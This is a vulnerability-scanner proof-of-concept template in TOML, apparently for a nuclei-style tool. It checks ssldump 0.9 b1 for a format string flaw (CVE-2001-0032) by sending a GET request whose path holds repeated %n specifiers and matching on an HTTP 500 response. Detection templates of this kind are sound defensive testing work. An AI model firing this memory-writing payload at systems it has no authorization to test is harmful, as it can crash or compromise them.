[info]
author = "ave"
description = "检测 ssldump 0.9 b1 远程格式字符串漏洞，通过在请求路径中注入格式字符串说明符验证目标是否存在内存操作漏洞"
id = "POC-AVE-2001-0016"
name = "ssldump 0.9 b1 Format String Vulnerability PoC"
severity = "critical"
tags = ["ave-2001-0016"]
vuln_id = [
    "CVE-2001-0032",
    "AVE-2001-0016",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/%n%n%n%n%n%n%n%n%n%n"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"
